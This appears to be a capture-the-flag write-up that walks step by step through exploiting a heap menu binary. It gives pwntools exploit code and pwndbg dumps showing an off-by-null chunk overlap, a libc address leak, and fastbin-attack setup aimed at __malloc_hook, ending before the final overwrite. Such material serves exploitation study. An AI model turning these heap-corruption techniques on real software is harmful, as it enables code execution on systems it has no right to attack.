write basic framework
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
context.log_level = 'debug'
context.binary = './pwn'
elf = context.binary
libc = elf.libc
p = process('./pwn')

def show():
    p.sendlineafter('choice:', '1')

def add(length, name):
    p.sendlineafter('choice:', '2')
    p.sendlineafter(':', str(length))
    p.sendafter(':', name)
    sleep(0.01)

def edit(idx, length, name):
    p.sendlineafter('choice:', '3')
    p.sendlineafter(':', str(idx))
    p.sendlineafter(':', str(length))
    p.sendafter(':', name)
    sleep(0.01)

def delete(idx):
    p.sendlineafter('choice:', '4')
    p.sendlineafter(':', str(idx))

p.interactive()
```
add 4 chunks, modify the 2nd one to overwrite, also the correct prev_size
```python
add(0xf0, '0' * 0xf0)
add(0x68, '1' * 0x68)
add(0xf0, '2' * 0xf0)
add(0x10, '3' * 0x10)

pause()
edit(1, 0x68, flat('1' * 0x60, 0x170))
```
```
gdb -q -p `pidof pwn` -ex "b *0x400c05" -ex "c"
```
```
pwndbg> heapbase
heapbase : 0x228a000
pwndbg> x/90gx 0x228a000
0x228a000:	0x0000000000000000	0x0000000000000021
0x228a010:	0x0000000000400896	0x00000000004008b1
0x228a020:	0x0000000000000000	0x0000000000000101
0x228a030:	0x3030303030303030	0x3030303030303030
0x228a040:	0x3030303030303030	0x3030303030303030
0x228a050:	0x3030303030303030	0x3030303030303030
0x228a060:	0x3030303030303030	0x3030303030303030
0x228a070:	0x3030303030303030	0x3030303030303030
0x228a080:	0x3030303030303030	0x3030303030303030
0x228a090:	0x3030303030303030	0x3030303030303030
0x228a0a0:	0x3030303030303030	0x3030303030303030
0x228a0b0:	0x3030303030303030	0x3030303030303030
0x228a0c0:	0x3030303030303030	0x3030303030303030
0x228a0d0:	0x3030303030303030	0x3030303030303030
0x228a0e0:	0x3030303030303030	0x3030303030303030
0x228a0f0:	0x3030303030303030	0x3030303030303030
0x228a100:	0x3030303030303030	0x3030303030303030
0x228a110:	0x3030303030303030	0x3030303030303030
0x228a120:	0x0000000000000000	0x0000000000000071
0x228a130:	0x3131313131313131	0x3131313131313131
0x228a140:	0x3131313131313131	0x3131313131313131
0x228a150:	0x3131313131313131	0x3131313131313131
0x228a160:	0x3131313131313131	0x3131313131313131
0x228a170:	0x3131313131313131	0x3131313131313131
0x228a180:	0x3131313131313131	0x3131313131313131
0x228a190:	0x3131313131313131	0x0000000000000101
0x228a1a0:	0x3232323232323232	0x3232323232323232
0x228a1b0:	0x3232323232323232	0x3232323232323232
0x228a1c0:	0x3232323232323232	0x3232323232323232
0x228a1d0:	0x3232323232323232	0x3232323232323232
0x228a1e0:	0x3232323232323232	0x3232323232323232
0x228a1f0:	0x3232323232323232	0x3232323232323232
0x228a200:	0x3232323232323232	0x3232323232323232
0x228a210:	0x3232323232323232	0x3232323232323232
0x228a220:	0x3232323232323232	0x3232323232323232
0x228a230:	0x3232323232323232	0x3232323232323232
0x228a240:	0x3232323232323232	0x3232323232323232
0x228a250:	0x3232323232323232	0x3232323232323232
0x228a260:	0x3232323232323232	0x3232323232323232
0x228a270:	0x3232323232323232	0x3232323232323232
0x228a280:	0x3232323232323232	0x3232323232323232
0x228a290:	0x0000000000000000	0x0000000000000021
0x228a2a0:	0x3333333333333333	0x3333333333333333
0x228a2b0:	0x0000000000000000	0x0000000000020ce1
0x228a2c0:	0x0000000000000000	0x0000000000000000
```
ni again and again
```
   0x400c27 <change_item+260>    mov    byte ptr [rax], 0
 â–º 0x400c2a <change_item+263>    jmp    change_item+275 <change_item+275>
```
101 changed to 100(p set to 0), prev size 0x170
```
pwndbg> x/90gx 0x228a000
0x228a000:	0x0000000000000000	0x0000000000000021
0x228a010:	0x0000000000400896	0x00000000004008b1
0x228a020:	0x0000000000000000	0x0000000000000101
0x228a030:	0x3030303030303030	0x3030303030303030
0x228a040:	0x3030303030303030	0x3030303030303030
0x228a050:	0x3030303030303030	0x3030303030303030
0x228a060:	0x3030303030303030	0x3030303030303030
0x228a070:	0x3030303030303030	0x3030303030303030
0x228a080:	0x3030303030303030	0x3030303030303030
0x228a090:	0x3030303030303030	0x3030303030303030
0x228a0a0:	0x3030303030303030	0x3030303030303030
0x228a0b0:	0x3030303030303030	0x3030303030303030
0x228a0c0:	0x3030303030303030	0x3030303030303030
0x228a0d0:	0x3030303030303030	0x3030303030303030
0x228a0e0:	0x3030303030303030	0x3030303030303030
0x228a0f0:	0x3030303030303030	0x3030303030303030
0x228a100:	0x3030303030303030	0x3030303030303030
0x228a110:	0x3030303030303030	0x3030303030303030
0x228a120:	0x0000000000000000	0x0000000000000071
0x228a130:	0x3131313131313131	0x3131313131313131
0x228a140:	0x3131313131313131	0x3131313131313131
0x228a150:	0x3131313131313131	0x3131313131313131
0x228a160:	0x3131313131313131	0x3131313131313131
0x228a170:	0x3131313131313131	0x3131313131313131
0x228a180:	0x3131313131313131	0x3131313131313131
0x228a190:	0x0000000000000170	0x0000000000000100
0x228a1a0:	0x3232323232323232	0x3232323232323232
0x228a1b0:	0x3232323232323232	0x3232323232323232
0x228a1c0:	0x3232323232323232	0x3232323232323232
0x228a1d0:	0x3232323232323232	0x3232323232323232
0x228a1e0:	0x3232323232323232	0x3232323232323232
0x228a1f0:	0x3232323232323232	0x3232323232323232
0x228a200:	0x3232323232323232	0x3232323232323232
0x228a210:	0x3232323232323232	0x3232323232323232
0x228a220:	0x3232323232323232	0x3232323232323232
0x228a230:	0x3232323232323232	0x3232323232323232
0x228a240:	0x3232323232323232	0x3232323232323232
0x228a250:	0x3232323232323232	0x3232323232323232
0x228a260:	0x3232323232323232	0x3232323232323232
0x228a270:	0x3232323232323232	0x3232323232323232
0x228a280:	0x3232323232323232	0x3232323232323232
0x228a290:	0x0000000000000000	0x0000000000000021
0x228a2a0:	0x3333333333333333	0x3333333333333333
0x228a2b0:	0x0000000000000000	0x0000000000020ce1
0x228a2c0:	0x0000000000000000	0x0000000000000000
```
delete 0, 2, will merge to a large chunk
```python
add(0xf0, '0' * 0xf0)
add(0x68, '1' * 0x68)
add(0xf0, '2' * 0xf0)
add(0x10, '3' * 0x10)

delete(0)
edit(1, 0x68, flat('1' * 0x60, 0x170))
pause()
delete(2)
```
```gdb -q -p `pidof pwn` -ex "b *0x400CDD" -ex "c"```, look fd bk
```
pwndbg> x/90gx 0x14c1000
0x14c1000:	0x0000000000000000	0x0000000000000021
0x14c1010:	0x0000000000400896	0x00000000004008b1
0x14c1020:	0x0000000000000000	0x0000000000000271
0x14c1030:	0x00007f50555b2b78	0x00007f50555b2b78
0x14c1040:	0x3030303030303030	0x3030303030303030
0x14c1050:	0x3030303030303030	0x3030303030303030
0x14c1060:	0x3030303030303030	0x3030303030303030
0x14c1070:	0x3030303030303030	0x3030303030303030
0x14c1080:	0x3030303030303030	0x3030303030303030
0x14c1090:	0x3030303030303030	0x3030303030303030
0x14c10a0:	0x3030303030303030	0x3030303030303030
0x14c10b0:	0x3030303030303030	0x3030303030303030
0x14c10c0:	0x3030303030303030	0x3030303030303030
0x14c10d0:	0x3030303030303030	0x3030303030303030
0x14c10e0:	0x3030303030303030	0x3030303030303030
0x14c10f0:	0x3030303030303030	0x3030303030303030
0x14c1100:	0x3030303030303030	0x3030303030303030
0x14c1110:	0x3030303030303030	0x3030303030303030
0x14c1120:	0x0000000000000100	0x0000000000000070
0x14c1130:	0x3131313131313131	0x3131313131313131
0x14c1140:	0x3131313131313131	0x3131313131313131
0x14c1150:	0x3131313131313131	0x3131313131313131
0x14c1160:	0x3131313131313131	0x3131313131313131
0x14c1170:	0x3131313131313131	0x3131313131313131
0x14c1180:	0x3131313131313131	0x3131313131313131
0x14c1190:	0x0000000000000170	0x0000000000000100
0x14c11a0:	0x3232323232323232	0x3232323232323232
0x14c11b0:	0x3232323232323232	0x3232323232323232
0x14c11c0:	0x3232323232323232	0x3232323232323232
0x14c11d0:	0x3232323232323232	0x3232323232323232
0x14c11e0:	0x3232323232323232	0x3232323232323232
0x14c11f0:	0x3232323232323232	0x3232323232323232
0x14c1200:	0x3232323232323232	0x3232323232323232
0x14c1210:	0x3232323232323232	0x3232323232323232
0x14c1220:	0x3232323232323232	0x3232323232323232
0x14c1230:	0x3232323232323232	0x3232323232323232
0x14c1240:	0x3232323232323232	0x3232323232323232
0x14c1250:	0x3232323232323232	0x3232323232323232
0x14c1260:	0x3232323232323232	0x3232323232323232
0x14c1270:	0x3232323232323232	0x3232323232323232
0x14c1280:	0x3232323232323232	0x3232323232323232
0x14c1290:	0x0000000000000270	0x0000000000000020
0x14c12a0:	0x3333333333333333	0x3333333333333333
0x14c12b0:	0x0000000000000000	0x0000000000020ce1
0x14c12c0:	0x0000000000000000	0x0000000000000000
```
add new chunk, to make fd the positon 0x14c1130 above
```python
add(0xf0, '0' * 0xf0)
add(0x68, '1' * 0x68)
add(0xf0, '2' * 0xf0)
add(0x10, '3' * 0x10)

delete(0)
edit(1, 0x68, flat('1' * 0x60, 0x170))
delete(2)
pause()
add(0xf0, 'x' * 0x10)

p.interactive()
```
```gdb -q -p `pidof pwn` -ex "b *0x400A6F" -ex "c"```
```
pwndbg> heapbase
heapbase : 0x6c3000
pwndbg> ni
pwndbg> x/90gx 0x6c3000
0x6c3000:	0x0000000000000000	0x0000000000000021
0x6c3010:	0x0000000000400896	0x00000000004008b1
0x6c3020:	0x0000000000000000	0x0000000000000101
0x6c3030:	0x00007fed0c14bdd8	0x00007fed0c14bdd8
0x6c3040:	0x3030303030303030	0x3030303030303030
0x6c3050:	0x3030303030303030	0x3030303030303030
0x6c3060:	0x3030303030303030	0x3030303030303030
0x6c3070:	0x3030303030303030	0x3030303030303030
0x6c3080:	0x3030303030303030	0x3030303030303030
0x6c3090:	0x3030303030303030	0x3030303030303030
0x6c30a0:	0x3030303030303030	0x3030303030303030
0x6c30b0:	0x3030303030303030	0x3030303030303030
0x6c30c0:	0x3030303030303030	0x3030303030303030
0x6c30d0:	0x3030303030303030	0x3030303030303030
0x6c30e0:	0x3030303030303030	0x3030303030303030
0x6c30f0:	0x3030303030303030	0x3030303030303030
0x6c3100:	0x3030303030303030	0x3030303030303030
0x6c3110:	0x3030303030303030	0x3030303030303030
0x6c3120:	0x0000000000000100	0x0000000000000171
0x6c3130:	0x00007fed0c14bb78	0x00007fed0c14bb78
0x6c3140:	0x3131313131313131	0x3131313131313131
0x6c3150:	0x3131313131313131	0x3131313131313131
0x6c3160:	0x3131313131313131	0x3131313131313131
0x6c3170:	0x3131313131313131	0x3131313131313131
0x6c3180:	0x3131313131313131	0x3131313131313131
0x6c3190:	0x0000000000000170	0x0000000000000100
0x6c31a0:	0x3232323232323232	0x3232323232323232
0x6c31b0:	0x3232323232323232	0x3232323232323232
0x6c31c0:	0x3232323232323232	0x3232323232323232
0x6c31d0:	0x3232323232323232	0x3232323232323232
0x6c31e0:	0x3232323232323232	0x3232323232323232
0x6c31f0:	0x3232323232323232	0x3232323232323232
0x6c3200:	0x3232323232323232	0x3232323232323232
0x6c3210:	0x3232323232323232	0x3232323232323232
0x6c3220:	0x3232323232323232	0x3232323232323232
0x6c3230:	0x3232323232323232	0x3232323232323232
0x6c3240:	0x3232323232323232	0x3232323232323232
0x6c3250:	0x3232323232323232	0x3232323232323232
0x6c3260:	0x3232323232323232	0x3232323232323232
0x6c3270:	0x3232323232323232	0x3232323232323232
0x6c3280:	0x3232323232323232	0x3232323232323232
0x6c3290:	0x0000000000000170	0x0000000000000020
0x6c32a0:	0x3333333333333333	0x3333333333333333
0x6c32b0:	0x0000000000000000	0x0000000000020ce1
0x6c32c0:	0x0000000000000000	0x0000000000000000
pwndbg> xinfo 0x00007fed0c14bb78
Extended information for virtual address 0x7fed0c14bb78:

  Containing mapping:
    0x7fed0c14b000     0x7fed0c14d000 rw-p     2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so

  Offset information:
         Mapped Area 0x7fed0c14bb78 = 0x7fed0c14b000 + 0xb78
         File (Base) 0x7fed0c14bb78 = 0x7fed0bd87000 + 0x3c4b78
      File (Segment) 0x7fed0c14bb78 = 0x7fed0c1477c0 + 0x43b8
         File (Disk) 0x7fed0c14bb78 = /lib/x86_64-linux-gnu/libc-2.23.so + 0x1c4b78

 Containing ELF sections:
               .data 0x7fed0c14bb78 = 0x7fed0c14b080 + 0xaf8
```
since it is overlapped, we can show to leak libc address
```python
add(0xf0, '0' * 0xf0)
add(0x68, '1' * 0x68)
add(0xf0, '2' * 0xf0)
add(0x10, '3' * 0x10)

delete(0)
edit(1, 0x68, flat('1' * 0x60, 0x170))
delete(2)
add(0xf0, 'x' * 0x10)
pause()
show()
```
```gdb -q -p `pidof pwn` -ex "b *0x40099B" -ex "c"```
ni again and again get
```
[*] Switching to interactive mode
[DEBUG] Received 0x14 bytes:
    b'0 : xxxxxxxxxxxxxxxx'
0 : xxxxxxxxxxxxxxxx[DEBUG] Received 0xa bytes:
    00000000  31 20 3a 20  78 0b ef fb  c7 7f                     â”‚1 : â”‚xÂ·Â·Â·â”‚Â·Â·â”‚
    0000000a
1 : x\x0b\xfb\xc7$  
```
write code to recv it
```python
add(0xf0, '0' * 0xf0)
add(0x68, '1' * 0x68)
add(0xf0, '2' * 0xf0)
add(0x10, '3' * 0x10)

delete(0)
edit(1, 0x68, flat('1' * 0x60, 0x170))
delete(2)
add(0xf0, 'x' * 0x10)
show()
libc.address = u64(p.recvuntil("\x7f")[-6:] + b'\0\0') - 0x3c4b78
print('libc @ {:#x}'.format(libc.address))
assert libc.address & 0xfff == 0
```
pause before show again, see the chunk to recover it
```python
pause()
show()
```
```gdb -q -p `pidof pwn` -ex "b *0x40099B" -ex "c"```
```
pwndbg> bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all [corrupted]
FD: 0x1974120 â—‚â€” 0x171
BK: 0x1974120 â€”â–¸ 0x7fd7c6ea0b78 (main_arena+88) â—‚â€” 0x1974120
smallbins
empty
largebins
empty
pwndbg> x/4gx 0x1974120
0x1974120:	0x0000000000000100	0x0000000000000171
0x1974130:	0x00007fd7c6ea0b78	0x00007fd7c6ea0b78
```
recover
```python
add(0x160, '4' * 0x160)
```
then repeat the above, to confirm the index is 4
```python
add(0xf0, 'a' * 0xf0)
add(0x68, 'b' * 0x68)
add(0xf0, 'c' * 0xf0)
add(0x10, 'd' * 0x10)

pause()
delete(0)
```
```gdb -q -p `pidof pwn```
```
pwndbg> telescope 0x6020C0 20
00:0000â”‚   0x6020c0 (itemlist) â—‚â€” 0xf0
01:0008â”‚   0x6020c8 (itemlist+8) â€”â–¸ 0x191c030 â—‚â€” 'xxxxxxxxxxxxxxxx'
02:0010â”‚   0x6020d0 (itemlist+16) â—‚â€” 0x68 /* 'h' */
03:0018â”‚   0x6020d8 (itemlist+24) â€”â–¸ 0x191c130 â—‚â€” 0x3434343434343434 ('44444444')
04:0020â”‚   0x6020e0 (itemlist+32) â—‚â€” 0x160
05:0028â”‚   0x6020e8 (itemlist+40) â€”â–¸ 0x191c130 â—‚â€” 0x3434343434343434 ('44444444')
06:0030â”‚   0x6020f0 (itemlist+48) â—‚â€” 0x10
07:0038â”‚   0x6020f8 (itemlist+56) â€”â–¸ 0x191c2a0 â—‚â€” '3333333333333333'
08:0040â”‚   0x602100 (itemlist+64) â—‚â€” 0xf0
09:0048â”‚   0x602108 (itemlist+72) â€”â–¸ 0x191c2c0 â—‚â€” 0x6161616161616161 ('aaaaaaaa')
0a:0050â”‚   0x602110 (itemlist+80) â—‚â€” 0x68 /* 'h' */
0b:0058â”‚   0x602118 (itemlist+88) â€”â–¸ 0x191c3c0 â—‚â€” 0x6262626262626262 ('bbbbbbbb')
0c:0060â”‚   0x602120 (itemlist+96) â—‚â€” 0xf0
0d:0068â”‚   0x602128 (itemlist+104) â€”â–¸ 0x191c430 â—‚â€” 0x6363636363636363 ('cccccccc')
0e:0070â”‚   0x602130 (itemlist+112) â—‚â€” 0x10
0f:0078â”‚   0x602138 (itemlist+120) â€”â–¸ 0x191c530 â—‚â€” 'dddddddddddddddd'
10:0080â”‚   0x602140 (itemlist+128) â—‚â€” 0x0
... â†“
```
then similar to above, but this time also del the 2nd chunk before then the fd make sense
```python
add(0xf0, 'a' * 0xf0)
add(0x68, 'b' * 0x68)
add(0xf0, 'c' * 0xf0)
add(0x10, 'd' * 0x10)

delete(4)
edit(5, 0x68, flat('1' * 0x60, 0x170))
delete(6)
delete(5)
pause()
add(0x120, flat(cyclic(n = 8, length = 0x120)))
```
```gdb -q -p `pidof pwn` -ex "b *0x400AB8" -ex "c"```
0x183f3c0 is the position we need
```
 â–º 0x400ab8 <add_item+257>    call   read@plt <read@plt>
        fd: 0x0
        buf: 0x183f2c0 â€”â–¸ 0x7f8ff4af8dd8 (main_arena+696) â€”â–¸ 0x7f8ff4af8dc8 (main_arena+680) â€”â–¸ 0x7f8ff4af8db8 (main_arena+664) â€”â–¸ 0x7f8ff4af8da8 (main_arena+648) â—‚â€” ...
        nbytes: 0x120
pwndbg> x/90gx 0x183f2c0-0x10
0x183f2b0:	0x0000000000000000	0x0000000000000131
0x183f2c0:	0x00007f8ff4af8dd8	0x00007f8ff4af8dd8
0x183f2d0:	0x6161616161616161	0x6161616161616161
0x183f2e0:	0x6161616161616161	0x6161616161616161
0x183f2f0:	0x6161616161616161	0x6161616161616161
0x183f300:	0x6161616161616161	0x6161616161616161
0x183f310:	0x6161616161616161	0x6161616161616161
0x183f320:	0x6161616161616161	0x6161616161616161
0x183f330:	0x6161616161616161	0x6161616161616161
0x183f340:	0x6161616161616161	0x6161616161616161
0x183f350:	0x6161616161616161	0x6161616161616161
0x183f360:	0x6161616161616161	0x6161616161616161
0x183f370:	0x6161616161616161	0x6161616161616161
0x183f380:	0x6161616161616161	0x6161616161616161
0x183f390:	0x6161616161616161	0x6161616161616161
0x183f3a0:	0x6161616161616161	0x6161616161616161
0x183f3b0:	0x0000000000000100	0x0000000000000070
0x183f3c0:	0x0000000000000000	0x3131313131313131
0x183f3d0:	0x3131313131313131	0x3131313131313131
0x183f3e0:	0x3131313131313131	0x0000000000000141
0x183f3f0:	0x00007f8ff4af8b78	0x00007f8ff4af8b78
0x183f400:	0x3131313131313131	0x3131313131313131
0x183f410:	0x3131313131313131	0x3131313131313131
0x183f420:	0x0000000000000170	0x0000000000000100
0x183f430:	0x6363636363636363	0x6363636363636363
0x183f440:	0x6363636363636363	0x6363636363636363
0x183f450:	0x6363636363636363	0x6363636363636363
0x183f460:	0x6363636363636363	0x6363636363636363
0x183f470:	0x6363636363636363	0x6363636363636363
0x183f480:	0x6363636363636363	0x6363636363636363
0x183f490:	0x6363636363636363	0x6363636363636363
0x183f4a0:	0x6363636363636363	0x6363636363636363
0x183f4b0:	0x6363636363636363	0x6363636363636363
0x183f4c0:	0x6363636363636363	0x6363636363636363
0x183f4d0:	0x6363636363636363	0x6363636363636363
0x183f4e0:	0x6363636363636363	0x6363636363636363
0x183f4f0:	0x6363636363636363	0x6363636363636363
0x183f500:	0x6363636363636363	0x6363636363636363
0x183f510:	0x6363636363636363	0x6363636363636363
0x183f520:	0x0000000000000140	0x0000000000000020
0x183f530:	0x6464646464646464	0x6464646464646464
0x183f540:	0x0000000000000000	0x00000000000209e1
0x183f550:	0x0000000000000000	0x0000000000000000
0x183f560:	0x0000000000000000	0x0000000000000000
0x183f570:	0x0000000000000000	0x0000000000000000
pwndbg> ni
pwndbg> x/90gx 0x183f2c0-0x10
0x183f2b0:	0x0000000000000000	0x0000000000000131
0x183f2c0:	0x6161616161616161	0x6161616161616162
0x183f2d0:	0x6161616161616163	0x6161616161616164
0x183f2e0:	0x6161616161616165	0x6161616161616166
0x183f2f0:	0x6161616161616167	0x6161616161616168
0x183f300:	0x6161616161616169	0x616161616161616a
0x183f310:	0x616161616161616b	0x616161616161616c
0x183f320:	0x616161616161616d	0x616161616161616e
0x183f330:	0x616161616161616f	0x6161616161616170
0x183f340:	0x6161616161616171	0x6161616161616172
0x183f350:	0x6161616161616173	0x6161616161616174
0x183f360:	0x6161616161616175	0x6161616161616176
0x183f370:	0x6161616161616177	0x6161616161616178
0x183f380:	0x6161616161616179	0x626161616161617a
0x183f390:	0x6261616161616162	0x6261616161616163
0x183f3a0:	0x6261616161616164	0x6261616161616165
0x183f3b0:	0x6261616161616166	0x6261616161616167
0x183f3c0:	0x6261616161616168	0x6261616161616169
0x183f3d0:	0x626161616161616a	0x626161616161616b
0x183f3e0:	0x3131313131313131	0x0000000000000141
0x183f3f0:	0x00007f8ff4af8b78	0x00007f8ff4af8b78
0x183f400:	0x3131313131313131	0x3131313131313131
0x183f410:	0x3131313131313131	0x3131313131313131
0x183f420:	0x0000000000000170	0x0000000000000100
0x183f430:	0x6363636363636363	0x6363636363636363
0x183f440:	0x6363636363636363	0x6363636363636363
0x183f450:	0x6363636363636363	0x6363636363636363
0x183f460:	0x6363636363636363	0x6363636363636363
0x183f470:	0x6363636363636363	0x6363636363636363
0x183f480:	0x6363636363636363	0x6363636363636363
0x183f490:	0x6363636363636363	0x6363636363636363
0x183f4a0:	0x6363636363636363	0x6363636363636363
0x183f4b0:	0x6363636363636363	0x6363636363636363
0x183f4c0:	0x6363636363636363	0x6363636363636363
0x183f4d0:	0x6363636363636363	0x6363636363636363
0x183f4e0:	0x6363636363636363	0x6363636363636363
0x183f4f0:	0x6363636363636363	0x6363636363636363
0x183f500:	0x6363636363636363	0x6363636363636363
0x183f510:	0x6363636363636363	0x6363636363636363
0x183f520:	0x0000000000000140	0x0000000000000020
0x183f530:	0x6464646464646464	0x6464646464646464
0x183f540:	0x0000000000000000	0x00000000000209e1
0x183f550:	0x0000000000000000	0x0000000000000000
0x183f560:	0x0000000000000000	0x0000000000000000
0x183f570:	0x0000000000000000	0x0000000000000000
pwndbg> cyclic -n 8 -l haaaaaab
256
```
test it, also set the correct prev size
```python
delete(4)
edit(5, 0x68, flat('1' * 0x60, 0x170))
delete(6)
delete(5)
#add(0x120, flat(cyclic(n = 8, length = 0x120)))
pause()
add(0x120, flat('a' * 248, 0x70, 0xdeedbeef))
```
```gdb -q -p `pidof pwn` -ex "b *0x400AB8" -ex "c"```
```
pwndbg> ni
pwndbg> fastbins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x1a743b0 â—‚â€” 0xdeedbeef
0x80: 0x0
pwndbg> magic
========== function ==========
system:0x453a0
execve:0xcc7f0
open:0xf70f0
read:0xf7310
write:0xf7370
gets:0x6ed90
setcontext+0x35:0x47b85
========== variables ==========
__malloc_hook(0x3c4b10)             : 0x0000000000000000
__free_hook(0x3c67a8)               : 0x0000000000000000
__realloc_hook(0x3c4b08)            : 0x00007fdc97442a70
stdin(-0x7fdc96dbaf50)              : 0x00007fdc977818e0
stdout(-0x7fdc96dbaf60)             : 0x00007fdc97782620
_IO_list_all(0x3c5520)              : 0x00007fdc97782540
__after_morecore_hook(0x3c67a0)     : 0x0000000000000000
pwndbg> p &__malloc_hook
$1 = (void *(**)(size_t, const void *)) 0x7fdc97781b10 <__malloc_hook>
pwndbg> x/20gx 0x7fdc97781b10-0x20
0x7fdc97781af0 <_IO_wide_data_0+304>:	0x00007fdc97780260	0x0000000000000000
0x7fdc97781b00 <__memalign_hook>:	0x00007fdc97442ea0	0x00007fdc97442a70
0x7fdc97781b10 <__malloc_hook>:	0x0000000000000000	0x0000000000000000
0x7fdc97781b20 <main_arena>:	0x0000000000000000	0x0000000000000000
0x7fdc97781b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000
0x7fdc97781b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000
0x7fdc97781b50 <main_arena+48>:	0x000000000089c3b0	0x0000000000000000
0x7fdc97781b60 <main_arena+64>:	0x0000000000000000	0x0000000000000000
0x7fdc97781b70 <main_arena+80>:	0x0000000000000000	0x000000000089c540
0x7fdc97781b80 <main_arena+96>:	0x000000000089c3e0	0x000000000089c3e0
pwndbg> x/4gx 0x7fdc97781b10-0x23
0x7fdc97781aed <_IO_wide_data_0+301>:	0xdc97780260000000	0x000000000000007f
0x7fdc97781afd:	0xdc97442ea0000000	0xdc97442a7000007f
```
then malloc twice, we can do fastbin attack to malloc_hook-0x23

